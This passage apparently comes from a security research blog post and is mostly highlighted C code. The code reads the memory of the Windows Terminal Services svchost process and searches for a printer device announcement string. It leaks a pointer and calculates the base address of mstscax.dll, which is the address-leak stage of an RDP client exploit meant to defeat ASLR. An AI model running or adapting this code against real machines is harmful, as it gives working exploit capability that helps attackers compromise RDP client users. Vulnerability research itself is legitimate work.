+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    Sleep(<span style="color:#ae81ff">20000</span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e">// The client will send a Device List Announcement upon initialization
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#75715e">// Retrieve the Device List Announcement (DR_PRN_DEVICE_ANNOUNCE) from svchost memory
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
+</span></span><span style="display:flex;"><span>    svchostPid <span style="color:#f92672">=</span> get_termservice_pid();
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span>svchostPid)
+</span></span><span style="display:flex;"><span>    {
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">1</span>;
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    hProcess <span style="color:#f92672">=</span> OpenProcess(PROCESS_VM_READ <span style="color:#f92672">|</span> PROCESS_QUERY_INFORMATION, <span style="color:#ae81ff">0</span>, svchostPid);
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span>hProcess)
+</span></span><span style="display:flex;"><span>    {
+</span></span><span style="display:flex;"><span>        printf(<span style="color:#e6db74">&#34;[x] Could not open svchost process. (%lu)</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, GetLastError());
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">1</span>;
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> (<span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>p <span style="color:#f92672">=</span> NULL; VirtualQueryEx(hProcess, p, <span style="color:#f92672">&amp;</span>info, <span style="color:#66d9ef">sizeof</span>(info)); p <span style="color:#f92672">+=</span> info.RegionSize)
+</span></span><span style="display:flex;"><span>    {
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> (info.State <span style="color:#f92672">==</span> MEM_COMMIT <span style="color:#f92672">&amp;&amp;</span> info.Protect <span style="color:#f92672">!=</span> PAGE_NOACCESS <span style="color:#f92672">&amp;&amp;</span> info.Protect <span style="color:#f92672">!=</span> PAGE_GUARD)
+</span></span><span style="display:flex;"><span>        {
+</span></span><span style="display:flex;"><span>            buffer <span style="color:#f92672">=</span> malloc(info.RegionSize);
+</span></span><span style="display:flex;"><span>            ReadProcessMemory(hProcess, info.BaseAddress, buffer, info.RegionSize, <span style="color:#f92672">&amp;</span>bytesRead);
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">for</span> (<span style="color:#66d9ef">int</span> i <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; i <span style="color:#f92672">&lt;</span> bytesRead; i<span style="color:#f92672">++</span>)
+</span></span><span style="display:flex;"><span>            {
+</span></span><span style="display:flex;"><span>                leak <span style="color:#f92672">=</span> (BYTE <span style="color:#f92672">*</span>)buffer <span style="color:#f92672">+</span> i;
+</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span>memcmp((<span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>)leak, (<span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>)<span style="color:#e6db74">L</span><span style="color:#e6db74">&#34;Brother&#34;</span>, <span style="color:#ae81ff">14</span>))
+</span></span><span style="display:flex;"><span>                {
+</span></span><span style="display:flex;"><span>                    <span style="color:#66d9ef">for</span> (<span style="color:#66d9ef">int</span> j <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; j <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">256</span>; j<span style="color:#f92672">++</span>)
+</span></span><span style="display:flex;"><span>                    {
+</span></span><span style="display:flex;"><span>                        <span style="color:#66d9ef">if</span> (leak[j <span style="color:#f92672">+</span> <span style="color:#ae81ff">7</span>] <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span> <span style="color:#f92672">&amp;&amp;</span> leak[j <span style="color:#f92672">+</span> <span style="color:#ae81ff">6</span>] <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span> <span style="color:#f92672">&amp;&amp;</span> leak[j <span style="color:#f92672">+</span> <span style="color:#ae81ff">5</span>] <span style="color:#f92672">==</span> <span style="color:#ae81ff">0x7f</span>)
+</span></span><span style="display:flex;"><span>                        {
+</span></span><span style="display:flex;"><span>                            printf(<span style="color:#e6db74">&#34;[+] Found address leak! 0x%p</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, <span style="color:#f92672">*</span>((<span style="color:#66d9ef">char</span> <span style="color:#f92672">**</span>)(leak <span style="color:#f92672">+</span> j)));
+</span></span><span style="display:flex;"><span>                            <span style="color:#66d9ef">for</span> (<span style="color:#66d9ef">int</span> k <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; k <span style="color:#f92672">&lt;</span> <span style="color:#66d9ef">sizeof</span>(vtable_offsets) <span style="color:#f92672">/</span> <span style="color:#66d9ef">sizeof</span>(vtable_offsets[<span style="color:#ae81ff">0</span>]); k<span style="color:#f92672">++</span>)
+</span></span><span style="display:flex;"><span>                            {
+</span></span><span style="display:flex;"><span>                                <span style="color:#66d9ef">if</span> (((<span style="color:#f92672">*</span>((<span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">long</span> <span style="color:#66d9ef">long</span> <span style="color:#f92672">*</span>)(leak <span style="color:#f92672">+</span> j))) <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">0xFFFF</span>) <span style="color:#f92672">==</span> (vtable_offsets[k] <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">0xFFFF</span>))
+</span></span><span style="display:flex;"><span>                                {
+</span></span><span style="display:flex;"><span>                                    printf(<span style="color:#e6db74">&#34;[+] -&gt; Potential base address for mstscax.dll: 0x%p</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, <span style="color:#f92672">*</span>((<span style="color:#66d9ef">char</span> <span style="color:#f92672">**</span>)(leak <span style="color:#f92672">+</span> j)) <span style="color:#f92672">-</span> vtable_offsets[k]);
+</span></span><span style="display:flex;"><span>                                }
+</span></span><span style="display:flex;"><span>                            }
+</span></span><span style="display:flex;"><span>                            <span style="color:#75715e">// hexdump((char *)leak, 256);
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>                        }
+</span></span><span style="display:flex;"><span>                    }
+</span></span><span style="display:flex;"><span>                }
+</span></span><span style="display:flex;"><span>            }
+</span></span><span style="display:flex;"><span>            free(buffer);
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    close_rdp();
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div> </div>
     <footer class="post-footer">
 
   <div class="post-footer-data">
